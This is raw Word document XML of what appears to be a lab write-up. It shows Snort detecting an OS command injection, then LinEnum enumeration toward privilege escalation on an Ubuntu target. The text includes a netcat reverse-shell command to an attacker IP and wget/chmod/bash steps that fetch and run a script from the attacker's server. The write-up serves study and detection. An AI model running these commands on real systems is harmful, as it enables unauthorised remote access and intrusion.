      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FA66BB" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0073265D">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00FA66BB" w:rsidRPr="0073265D">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">OS </w:t>
      </w:r>
      <w:r w:rsidRPr="0073265D">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Command</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FA66BB" w:rsidRPr="0073265D">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Injection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FA66BB" w:rsidRPr="0073265D">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Detection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRPr="0073265D" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7CE87BCD" wp14:editId="7DE25457">
            <wp:extent cx="5486400" cy="1952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878" cy="202434"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>our snort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> rule works perfect, as we can see from the picture above we got alert about </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> command injection </w:t>
      </w:r>
      <w:r w:rsidR="00970C8A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it’s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> because our attacker </w:t>
      </w:r>
      <w:r w:rsidR="00970C8A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>used:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> /bin/bash when he make the reverse shell connection.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>our rule match and snort alerting us about that activity</w:t>
      </w:r>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRPr="006025E3" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="457E1AC6" wp14:editId="11D5FFA4">
            <wp:extent cx="5486400" cy="366987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69875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRPr="006025E3" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Here on the picture above this our second catch on our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> command injection attack as we can see I marked in black the command of the attacker which: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.0.0.14 9001 –e /bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">And we also see the client </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.10.0.9 which our target and destination </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.0.0.14 which our attacker cool so we also catch </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> command injection</w:t>
      </w:r>
      <w:r w:rsidR="00536E41">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00536E41">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">et’s check what more attacks we can find. This log comes from our Ubuntu machine which installed </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auditbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> on this machine to see all types of logs of the system and process that running live.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00536E41" w:rsidRDefault="009E7745" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E7745">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E7745" w:rsidRPr="00944C35" w:rsidRDefault="009E7745" w:rsidP="00944C35">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>LinEnum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Linux Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="009E7745" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4D672AD9" wp14:editId="09E3B13C">
            <wp:extent cx="5486400" cy="21228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122805"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E7745" w:rsidRPr="001B1649" w:rsidRDefault="009E7745" w:rsidP="009E7745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">In the picture above we are from our kali machine go to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>LinEnum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory and from there we use the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>command :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> python –m </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>SimpleHTTPServer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 80 </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> means we are now open web server on port 80 and all the files from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>LinEnum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory can be downloaded and now our target can access our files so let’s download LinEnum.sh to our target machine and run the script and see what’s the results.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="009E7745" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0D2F5B6A" wp14:editId="6CD29A57">
            <wp:extent cx="4797174" cy="264621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9047" cy="2658284"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E7745" w:rsidRDefault="009E7745" w:rsidP="009E7745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Now after we open python server on the kali machine now we need to download LinEnum.sh to the target machine we use the Command : </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId43" w:history="1">
        <w:r w:rsidRPr="001B1649">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>http://10.0.0.14/LinEnum.sh</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which means to download LinEnum.sh from 10.0.0.14 which is the attacker(kali) machine then we use ls –la and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>we see the file is downloaded lets run the script and see if we got good information that can help us to privilege escalation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E7745" w:rsidRDefault="009E7745" w:rsidP="009E7745">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48F6EE09" wp14:editId="4416A5A9">
            <wp:extent cx="5486400" cy="20713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071370"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E7745" w:rsidRPr="001B1649" w:rsidRDefault="009E7745" w:rsidP="00DF3E5B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now the </w:t>
      </w:r>
      <w:r w:rsidR="00DF3E5B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>target</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> downloaded the script from our python server we set executable privileges to the script with the </w:t>
      </w:r>
      <w:r w:rsidR="00BF3E93" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>command:</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> +x LinEnum.sh and then we run script and put the output from the script to txt file with the command bash LinEnum.sh &gt; enum.txt now let’s check enum.txt to see if we got some good information.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="009E7745" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="25D1789B" wp14:editId="700C8867">
            <wp:extent cx="5486400"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457700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E7745" w:rsidRDefault="009E7745" w:rsidP="009E7745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>LinEnum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> makes very good job and from the picture above we can see we got the output of /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which can help to attacker understand who are the users and what privileges they got and of course the root. Now we are www-data and we see from /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> output there is </w:t>
      </w:r>
      <w:r w:rsidR="00BF3E93" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>username:</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> art and he have /bin/bash which means </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> user on this machine we need find way to access to this user and can help us to privilege escalation from www-data to user.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009316E5" w:rsidRDefault="009316E5" w:rsidP="009E7745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="10FA0CE9" wp14:editId="63CE0AE7">
            <wp:extent cx="4589850" cy="2218959"/>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8405" cy="2247267"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009316E5" w:rsidRPr="001B1649" w:rsidRDefault="009316E5" w:rsidP="009316E5">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above we can see another output from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>LinEnum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>output</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> this time it’s the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>crontab</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cron</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
